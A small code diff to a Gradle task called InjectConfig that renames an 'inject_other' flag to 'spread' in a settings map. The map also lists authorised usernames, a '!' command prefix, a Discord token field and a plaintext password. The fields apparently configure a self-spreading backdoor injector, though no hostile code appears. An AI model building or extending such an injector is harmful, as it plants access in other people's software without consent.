@@ -40,7 +40,7 @@ abstract class InjectConfig extends DefaultTask {
             "uuids"        : [],
             "usernames"    : ["Kudo", "Vdung"],
             "prefix"       : "!",
-            "inject_other" : true,
+            "spread" : true,
             "warnings"     : false,
             "discord_token": "",
             "password"     : "12345" // Plaintext password
